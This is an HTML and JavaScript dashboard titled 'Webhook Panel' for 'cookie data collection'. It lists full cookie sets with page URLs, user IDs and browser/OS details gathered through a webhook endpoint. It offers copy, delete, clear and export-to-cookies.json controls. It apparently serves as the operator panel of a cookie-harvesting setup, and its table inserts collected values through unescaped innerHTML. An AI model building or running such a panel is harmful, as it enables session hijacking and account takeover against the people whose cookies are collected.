<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webhook Panel</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        .cookie-table {
            max-height: 400px;
            overflow-y: auto;
        }
        .loading {
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="bg-gray-100">
    <div class="container mx-auto px-4 py-8">
        <header class="mb-8">
            <h1 class="text-3xl font-bold text-gray-800">Webhook Panel</h1>
            <p class="text-gray-600">Monitor and manage cookie data collection</p>
        </header>

        <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
            <!-- Stats Card -->
            <div class="bg-white rounded-lg shadow p-6">
                <h2 class="text-xl font-semibold mb-4">Statistics</h2>
                <div class="grid grid-cols-2 gap-4">
                    <div class="text-center">
                        <p class="text-gray-600">Total Requests</p>
                        <p id="totalRequests" class="text-2xl font-bold">0</p>
                    </div>
                    <div class="text-center">
                        <p class="text-gray-600">Active Users</p>
                        <p id="activeUsers" class="text-2xl font-bold">0</p>
                    </div>
                </div>
                <canvas id="requestChart" class="mt-4"></canvas>
            </div>

            <!-- Controls Card -->
            <div class="bg-white rounded-lg shadow p-6">
                <h2 class="text-xl font-semibold mb-4">Controls</h2>
                <div class="space-y-4">
                    <div>
                        <label class="block text-gray-700 mb-2">User ID Filter</label>
                        <input type="text" id="userIdFilter" class="w-full px-3 py-2 border rounded-lg">
                    </div>
                    <div>
                        <label class="block text-gray-700 mb-2">Limit Results</label>
                        <input type="number" id="limitResults" value="50" min="1" max="100" class="w-full px-3 py-2 border rounded-lg">
                    </div>
                    <div class="flex space-x-4">
                        <button id="refreshBtn" class="bg-blue-500 text-white px-4 py-2 rounded-lg hover:bg-blue-600">
                            Refresh Data
                        </button>
                        <button id="clearBtn" class="bg-red-500 text-white px-4 py-2 rounded-lg hover:bg-red-600">
                            Clear Data
                        </button>
                        <button id="exportBtn" class="bg-green-500 text-white px-4 py-2 rounded-lg hover:bg-green-600">
                            Export JSON
                        </button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Data Table -->
        <div class="bg-white rounded-lg shadow p-6">
            <h2 class="text-xl font-semibold mb-4">Cookie Data</h2>
            <div class="cookie-table">
                <table class="min-w-full">
                    <thead>
                        <tr class="bg-gray-50">
                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Time</th>
                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">URL</th>
                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Cookies</th>
                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Device Info</th>
                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Actions</th>
                        </tr>
                    </thead>
                    <tbody id="cookieTableBody">
                        <!-- Data will be populated here -->
                    </tbody>
                </table>
            </div>
        </div>

        <!-- Cookie Detail Modal -->
        <div id="cookieModal" class="fixed inset-0 bg-gray-600 bg-opacity-50 hidden">
            <div class="relative top-20 mx-auto p-5 border w-4/5 shadow-lg rounded-md bg-white">
                <div class="mt-3">
                    <h3 class="text-lg font-medium text-gray-900 mb-4">Cookie Details</h3>
                    <div class="mt-2 text-sm text-gray-500">
                        <pre id="cookieDetail" class="whitespace-pre-wrap bg-gray-100 p-4 rounded"></pre>
                    </div>
                    <div class="flex justify-end mt-4 space-x-4">
                        <button id="copyJson" class="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600">
                            Copy JSON
                        </button>
                        <button id="closeModal" class="bg-gray-500 text-white px-4 py-2 rounded hover:bg-gray-600">
                            Close
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let requestChart = null;
        let currentData = [];

        // Initialize Chart
        function initChart() {
            const ctx = document.getElementById('requestChart').getContext('2d');
            requestChart = new Chart(ctx, {
                type: 'line',
                data: {
                    labels: [],
                    datasets: [{
                        label: 'Requests per Hour',
                        data: [],
                        borderColor: 'rgb(59, 130, 246)',
                        tension: 0.1
                    }]
                },
                options: {
                    responsive: true,
                    scales: {
                        y: {
                            beginAtZero: true
                        }
                    }
                }
            });
        }

        // Fetch and display data
        async function fetchData() {
            const userId = document.getElementById('userIdFilter').value;
            const limit = document.getElementById('limitResults').value;
            
            try {
                const response = await fetch(`/api/webhook?userId=${userId}&limit=${limit}`);
                const data = await response.json();
                
                updateTable(data);
                updateStats(data);
                updateChart(data);
            } catch (error) {
                console.error('Error fetching data:', error);
            }
        }

        // Update table with data
        function updateTable(data) {
            currentData = data;
            const tbody = document.getElementById('cookieTableBody');
            tbody.innerHTML = '';

            data.forEach(entry => {
                const row = document.createElement('tr');
                row.className = 'hover:bg-gray-50';
                row.innerHTML = `
                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                        ${new Date(entry.time).toLocaleString()}
                    </td>
                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                        ${entry.url}
                    </td>
                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                        ${entry.cookieCount} cookies
                        <button onclick="showCookieDetail(${entry.id})" class="ml-2 text-blue-600 hover:text-blue-900">
                            View
                        </button>
                    </td>
                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                        ${entry.deviceInfo.browser} on ${entry.deviceInfo.os}
                        <button onclick="showDeviceDetail(${entry.id})" class="ml-2 text-blue-600 hover:text-blue-900">
                            Details
                        </button>
                    </td>
                    <td class="px-6 py-4 whitespace-nowrap text-sm font-medium">
                        <button onclick="copyEntry(${entry.id})" class="text-blue-600 hover:text-blue-900 mr-3">
                            Copy
                        </button>
                        <button onclick="deleteEntry('${entry.id}')" class="text-red-600 hover:text-red-900">
                            Delete
                        </button>
                    </td>
                `;
                tbody.appendChild(row);
            });
        }

        // Update statistics
        function updateStats(data) {
            document.getElementById('totalRequests').textContent = data.length;
            const uniqueUsers = new Set(data.map(entry => entry.userId)).size;
            document.getElementById('activeUsers').textContent = uniqueUsers;
        }

        // Update chart
        function updateChart(data) {
            const hourlyData = {};
            data.forEach(entry => {
                const hour = new Date(entry.time).getHours();
                hourlyData[hour] = (hourlyData[hour] || 0) + 1;
            });

            const hours = Object.keys(hourlyData).sort((a, b) => a - b);
            const counts = hours.map(hour => hourlyData[hour]);

            requestChart.data.labels = hours.map(hour => `${hour}:00`);
            requestChart.data.datasets[0].data = counts;
            requestChart.update();
        }

        // Delete entry
        async function deleteEntry(id) {
            try {
                await fetch('/api/webhook', {
                    method: 'DELETE',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ ids: [id] })
                });
                fetchData();
            } catch (error) {
                console.error('Error deleting entry:', error);
            }
        }

        // Clear all data
        async function clearAllData() {
            if (!confirm('Are you sure you want to clear all data?')) return;
            
            try {
                await fetch('/api/webhook', {
                    method: 'DELETE',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ deleteAll: true })
                });
                fetchData();
            } catch (error) {
                console.error('Error clearing data:', error);
            }
        }

        // Show cookie detail modal
        function showCookieDetail(id) {
            const entry = currentData.find(e => e.id === id);
            if (!entry) return;

            const modal = document.getElementById('cookieModal');
            const detail = document.getElementById('cookieDetail');
            detail.textContent = JSON.stringify(entry.cookies, null, 2);
            modal.classList.remove('hidden');
        }

        // Show device detail modal
        function showDeviceDetail(id) {
            const entry = currentData.find(e => e.id === id);
            if (!entry) return;

            const modal = document.getElementById('cookieModal');
            const detail = document.getElementById('cookieDetail');
            detail.textContent = JSON.stringify(entry.deviceInfo, null, 2);
            modal.classList.remove('hidden');
        }

        // Copy entry data
        function copyEntry(id) {
            const entry = currentData.find(e => e.id === id);
            if (!entry) return;

            navigator.clipboard.writeText(JSON.stringify(entry, null, 2))
                .then(() => alert('Data copied to clipboard!'))
                .catch(err => console.error('Failed to copy:', err));
        }

        // Export all data as JSON
        async function exportJson() {
            const response = await fetch('/api/webhook?format=json');
            const blob = await response.blob();
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'cookies.json';
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
            document.body.removeChild(a);
        }

        // Event listeners
        document.addEventListener('DOMContentLoaded', () => {
            initChart();
            fetchData();

            document.getElementById('refreshBtn').addEventListener('click', fetchData);
            document.getElementById('clearBtn').addEventListener('click', clearAllData);
            document.getElementById('exportBtn').addEventListener('click', exportJson);
            document.getElementById('userIdFilter').addEventListener('change', fetchData);
            document.getElementById('limitResults').addEventListener('change', fetchData);
            document.getElementById('closeModal').addEventListener('click', () => {
                document.getElementById('cookieModal').classList.add('hidden');
            });
            document.getElementById('copyJson').addEventListener('click', () => {
                const detail = document.getElementById('cookieDetail').textContent;
                navigator.clipboard.writeText(detail)
                    .then(() => alert('JSON copied to clipboard!'))
                    .catch(err => console.error('Failed to copy:', err));
            });
        });

        // Auto-refresh every minute
        setInterval(fetchData, 60000);
    </script>
</body>
</html>